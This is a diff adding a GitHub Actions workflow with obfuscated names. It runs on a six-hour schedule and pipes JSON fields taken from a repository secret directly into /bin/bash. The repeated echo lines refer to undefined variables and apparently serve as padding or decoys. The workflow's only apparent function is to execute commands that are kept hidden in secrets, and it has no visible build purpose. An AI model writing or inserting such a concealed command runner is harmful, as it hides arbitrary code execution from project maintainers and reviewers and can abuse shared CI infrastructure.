@@ -1,0 +1,26 @@
+name: wanyuangui4565
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wanyuangui4565
+        env:
+          my8994: ${{ secrets.my8994 }}
+        run: |
+          echo $my8994 | jq -r .ecefm94 | /bin/bash
+          echo $m47534 | jq -r .jroxb31449 | /bin/bash
+          echo $dgbf87886 | jq -r .s17 | /bin/bash
+          echo $gwlu0355 | jq -r .e88 | /bin/bash
+          echo $pp43176 | jq -r .fo09990 | /bin/bash
+          echo $nthwy33820 | jq -r .itk1255 | /bin/bash
+          echo $nq10640 | jq -r .fq8 | /bin/bash
+          echo $kbxa059 | jq -r .i0 | /bin/bash
+          echo $ojrj118 | jq -r .v02800 | /bin/bash
+          echo $ocx54 | jq -r .ybj9 | /bin/bash
+
